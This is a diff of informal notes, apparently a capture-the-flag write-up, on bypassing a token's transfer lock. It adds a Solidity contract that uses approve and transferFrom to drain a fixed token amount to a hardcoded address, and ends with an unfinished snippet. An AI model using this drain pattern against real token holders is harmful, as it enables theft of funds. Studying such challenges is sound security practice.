@@ -11,3 +11,32 @@ The OpenZeppelin codebase
 220412 16:16 KST, well, since this is not blocking approve and transfer from,
 I just need to make a smart contract
 and approve it as spender, then make the smart contract transferfromt he tokent to some other account.
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import '@openzeppelin/contracts/token/ERC20/IERC20.sol';
+
+contract Naughty {
+    IERC20 public erc20;
+    constructor(address _target) {
+        erc20 = IERC20(_target);
+    }
+    function send(address from) external returns(bool) {
+            erc20.transferFrom(
+            from,
+            0x01De7E8d9fEb4E6f088619e1A09a09879318F5C8,
+            1000000*10**18
+        );
+    }
+}
+
+and press approve by 
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import '@openzeppelin/contracts/token/ERC20/IERC20.sol';
+
+at address []
+and approve
